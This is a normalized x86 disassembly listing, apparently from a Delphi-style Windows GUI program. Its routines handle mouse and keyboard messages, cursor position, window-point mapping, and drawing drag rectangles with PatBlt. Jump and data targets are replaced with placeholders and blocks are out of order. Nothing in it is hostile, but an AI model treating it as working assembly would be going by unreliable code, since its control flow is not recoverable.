call ReleaseDC
retn
sub_440a6c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax edi
call sub_4415ac
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43ff08
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d5c
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_441578
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43e714
sub_440b3e
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_440b7a
mov eax eax
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_440bc8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_440bf4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_440368
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_440354
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a14
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a14
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_446be4
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_440cd6
mov eax eax
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_440d24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403448
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403448
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_440de8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_440e34
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_440e80
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440f9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_423754
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440fa2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_440fd4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43ff08
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403448
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403448
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403448
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403448
jmp r-xdata
sub_4410c4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418ddc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_4415ac
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_440354
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_440368
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_418e2c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4412a4
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43fedc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403448
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_446be4
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43dad8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44128f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_446be4
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_446be4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40324c
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43fd64
test esi esi
je r-xdata
sub_4412a4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403448
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_442128
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403448
mov eax esi
call sub_43fe0c
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43fdc8
mov ecx eax
xor edx edx
xor eax eax
call sub_418e04
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403448
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_441348
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_441378
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_4413e4
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_4414a4
sub_441414
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_441444
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43ff08
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_441470
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_4414a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_441578
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4415ac
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_441644
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_457218
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_457218
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43ff64
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_460a6c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403448
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45715c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403448
jmp r-xdata
sub_4417d8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408b10
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408b3c
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43ff64
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408968
call sub_408904
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408904
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_441880
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_4418b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_441874
push ebp
call sub_441880
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441900
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44198c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4419c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_441444
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4570cc
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403448
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4570cc
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403448
sub_441a48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43ff34
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4405fc
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_4419c4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_441a94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43ff34
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_441ab0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43ff34
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4405fc
mov al [ r-xdata ]
push eax
